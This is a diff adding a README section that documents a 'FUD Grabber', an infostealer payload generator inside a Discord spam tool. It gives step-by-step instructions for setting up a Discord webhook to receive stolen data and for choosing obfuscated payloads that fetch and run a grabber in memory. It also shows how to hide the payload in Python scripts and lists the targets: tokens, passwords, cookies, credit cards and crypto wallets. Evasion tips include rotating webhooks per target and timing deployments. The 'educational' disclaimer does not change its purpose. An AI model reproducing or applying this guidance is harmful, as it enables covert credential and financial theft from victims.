@@ -81,6 +81,269 @@ This Discord AIO Tool provides an extensive collection of automation features or
 
 ---
 
+## 🎣 FUD Grabber - Complete Guide for Beginners
+
+### 🔍 What is the FUD Grabber?
+
+The **FUD Grabber** (Fully Undetectable Grabber) is an advanced stealth tool that creates ultra-compact, encrypted payloads for educational security research. It's designed to be completely undetectable by antivirus software while extracting sensitive data from target systems.
+
+### ⚠️ Important Disclaimer
+**This tool is for EDUCATIONAL PURPOSES ONLY!** 
+- Use only on systems you own or have explicit permission to test
+- Never use for malicious purposes or unauthorized access
+- Always comply with local laws and regulations
+- The author is not responsible for any misuse
+
+### 🚀 How the FUD Grabber Works
+
+#### 🔧 Core Technology
+The FUD Grabber uses advanced obfuscation and encryption techniques:
+
+1. **Multi-Layer Encryption**: XOR, Base64, Zlib, and BZ2 compression
+2. **Stealth Execution**: In-memory execution only, no file system traces
+3. **Anti-Detection**: Random timing delays and import hiding
+4. **Compact Payloads**: Ultra-small code size (340-600 characters)
+5. **Dynamic Loading**: Downloads and executes code from GitHub repositories
+
+#### 📊 Data Collection Capabilities
+- **Discord Tokens**: All Discord accounts with full user details
+- **Browser Data**: Passwords, cookies, history, autofill information
+- **System Information**: Hardware specs, network configuration
+- **Cryptocurrency Wallets**: Exodus, MetaMask, Phantom, Electrum
+- **Gaming Accounts**: Steam, Minecraft, Riot Games, Epic Games
+- **VPN Configurations**: OpenVPN, NordVPN, ExpressVPN settings
+
+### 📋 Step-by-Step Usage Guide
+
+#### Step 1: Set Up Your Webhook
+1. **Create a Discord Webhook**:
+   - Go to any Discord server where you have permissions
+   - Right-click on a channel → "Edit Channel"
+   - Go to "Integrations" → "Webhooks"
+   - Click "New Webhook" and copy the URL
+
+2. **Set the Webhook in TTS Spammer**:
+   - Start the TTS Spammer tool
+   - Go to "Grabber" → "Set Webhook"
+   - Paste your Discord webhook URL
+   - Confirm the webhook is set successfully
+
+#### Step 2: Access the FUD Grabber
+1. **Navigate to FUD Grabber**:
+   - In the main menu, select "FUD Grabber"
+   - You'll see the FUD Grabber interface
+
+#### Step 3: Choose Your Payload Type
+The FUD Grabber offers three variants:
+
+##### 🔥 SHORT Variant (~340 characters)
+- **Best for**: Maximum stealth and minimal size
+- **Features**: 
+  - Ultra-compact payload
+  - Fastest execution
+  - Basic encryption
+  - Zlib compression
+  - In-memory execution
+
+##### 🛡️ LONG Variant (~550 characters)
+- **Best for**: Advanced stealth features
+- **Features**:
+  - XOR + Base64 URL encryption
+  - Triple-layer code encryption
+  - Double compression (BZ2 + Zlib)
+  - Random timing delays
+  - Stealth libraries included
+
+##### ⚡ ULTRA Variant (~500 characters)
+- **Best for**: Maximum stealth with optimized size
+- **Features**:
+  - XOR encryption of URLs (key=69)
+  - Double-layer code encryption
+  - Double compression (Zlib + Base64)
+  - Random timing delays (0-0.3s)
+  - Compact size optimization
+
+#### Step 4: Generate Your Payload
+1. **Select Variant**: Choose SHORT, LONG, or ULTRA
+2. **Review Features**: The tool shows detailed capabilities
+3. **Generate Payload**: Your encrypted payload is created
+4. **Copy Payload**: The generated code is displayed and ready to use
+
+### 🔧 How to Use the Generated Payload
+
+#### Method 1: Python Script Injection
+```python
+# Add this line to any Python script
+import os; [YOUR_GENERATED_PAYLOAD_HERE]
+```
+
+#### Method 2: Comment Hiding
+```python
+# System check: [YOUR_GENERATED_PAYLOAD_HERE]
+```
+
+#### Method 3: Function Hiding
+```python
+def update(): [YOUR_GENERATED_PAYLOAD_HERE]
+```
+
+### 📊 Payload Workflow Explanation
+
+#### SHORT Variant Workflow:
+1. `;import` prefix ensures compatibility
+2. Zlib decompression of payload
+3. Installs: requests, pycryptodome
+4. Downloads GitHub Grabber
+5. Base64 + Zlib encrypts downloaded code
+6. Executes encrypted grabber in memory
+7. Fast execution, basic encryption
+
+#### LONG Variant Workflow:
+1. `;import` prefix ensures compatibility
+2. Random timing delays for stealth
+3. BZ2 + Zlib double decompression
+4. XOR + Base64 URL encryption
+5. Installs stealth libraries (4 packages)
+6. Triple-layer encryption of grabber code
+7. Executes advanced data extraction
+8. Sends encrypted results to webhook
+
+#### ULTRA Variant Workflow:
+1. `;import` prefix ensures compatibility
+2. Double-compression (Zlib + Base64)
+3. XOR encryption of URLs (key=69)
+4. Random timing delays (0-0.3s)
+5. Installs core libraries (requests, pycryptodome)
+6. Double-layer encryption of downloaded code
+7. Base64 + Zlib decryption chain
+8. In-memory execution only
+9. Compact but maximum stealth
+10. Optimized for size and evasion
+
+### 🛡️ Stealth Features Explained
+
+#### Anti-Detection Mechanisms:
+- **Import Hiding**: Uses `__import__()` instead of direct imports
+- **Random Delays**: Prevents pattern detection
+- **Memory Execution**: No file system traces
+- **Encrypted URLs**: Webhook and GitHub URLs are encrypted
+- **Compressed Code**: Multiple compression layers
+- **XOR Encryption**: Simple but effective obfuscation
+
+#### Evasion Techniques:
+- **Size Optimization**: Minimal payload size
+- **Timing Randomization**: Random execution delays
+- **Library Installation**: Dynamic dependency loading
+- **Error Handling**: Graceful failure modes
+- **Compatibility**: Works across Python versions
+
+### 🔍 Data Collection Process
+
+When executed, the payload:
+
+1. **Downloads the Full Grabber**: Fetches the complete grabber from GitHub
+2. **Installs Dependencies**: Automatically installs required libraries
+3. **Scans System**: Searches for Discord tokens, browser data, etc.
+4. **Encrypts Data**: All collected data is encrypted
+5. **Sends to Webhook**: Securely transmits data to your Discord webhook
+6. **Self-Destructs**: Removes traces from memory
+
+### 📱 What Data Gets Collected
+
+#### Discord Information:
+- All Discord tokens (Desktop, Canary, PTB, Development)
+- User details, Nitro status, payment methods
+- Account creation date, email addresses
+- 2FA status and backup codes
+
+#### Browser Data:
+- **Chrome, Edge, Brave, Opera**: Passwords, cookies, history
+- **Firefox**: Profile data and session information
+- **Autofill Data**: Credit cards, addresses, personal info
+- **Download History**: Recent file downloads
+
+#### System Information:
+- **Hardware Specs**: CPU, RAM, GPU, storage
+- **Network Info**: IP addresses, WiFi networks
+- **Installed Software**: Program list and versions
+- **System Configuration**: Windows settings and registry
+
+#### Cryptocurrency & Gaming:
+- **Wallets**: Exodus, MetaMask, Phantom, Electrum
+- **Gaming**: Steam, Minecraft, Riot Games, Epic Games
+- **VPN Configs**: OpenVPN, NordVPN, ExpressVPN
+
+### ⚠️ Safety and Legal Considerations
+
+#### ✅ Legal Use Cases:
+- **Educational Research**: Learning about cybersecurity
+- **Penetration Testing**: Authorized security assessments
+- **Personal Systems**: Testing your own devices
+- **Security Awareness**: Understanding attack vectors
+
+#### ❌ Illegal Use Cases:
+- **Unauthorized Access**: Using on systems you don't own
+- **Malicious Intent**: Stealing data for harm
+- **Privacy Violations**: Collecting personal information illegally
+- **Corporate Espionage**: Industrial espionage activities
+
+### 🛠️ Troubleshooting
+
+#### Common Issues:
+
+**"Webhook not found"**
+- Ensure you've set the webhook in the TTS Spammer
+- Check that the webhook URL is valid
+- Verify Discord server permissions
+
+**"Payload too large"**
+- Use the SHORT variant for smaller payloads
+- Check your target environment's limitations
+- Consider using the ULTRA variant for optimization
+
+**"Antivirus detection"**
+- The FUD Grabber is designed to be undetectable
+- If detected, try a different variant
+- Ensure you're using the latest version
+
+**"No data collected"**
+- Check internet connectivity
+- Verify the target has the expected data
+- Review webhook permissions and validity
+
+### 📚 Advanced Usage Tips
+
+#### For Maximum Stealth:
+1. **Use ULTRA Variant**: Best balance of size and features
+2. **Test on Virtual Machines**: Safe testing environment
+3. **Monitor Webhook**: Check for successful data transmission
+4. **Rotate Webhooks**: Use different webhooks for different targets
+5. **Time Your Deployments**: Avoid peak detection hours
+
+#### For Educational Purposes:
+1. **Document Everything**: Keep detailed logs of your testing
+2. **Use Isolated Environments**: Test only on controlled systems
+3. **Understand the Code**: Study how the payload works
+4. **Practice Responsible Disclosure**: Report vulnerabilities ethically
+5. **Stay Updated**: Keep the tool updated for latest features
+
+### 🔗 Related Tools
+
+The FUD Grabber works alongside other tools in the TTS Spammer:
+
+- **Token Grabber**: Full-featured data extraction tool
+- **GitHub Grabber**: Advanced browser data harvesting
+- **Mini Payload Generator**: Ultra-compact payload creation
+- **QR Code Grabber**: Discord QR code-based token extraction
+
+### 📞 Support and Community
+
+- **Discord Server**: [https://discord.gg/q3TkBrRcVX](https://discord.gg/q3TkBrRcVX)
+- **GitHub Issues**: Report bugs and request features
+- **Documentation**: Check the GRABBER_SETUP_GUIDE.md for technical details
+
+---
+
 ## 🚀 How It Works
 
 This Discord automation tool is built with Python and provides a user-friendly interface for various Discord-related tasks. The tool is designed with safety and educational purposes in mind, featuring built-in rate limiting, error handling, and confirmation prompts for potentially destructive actions.
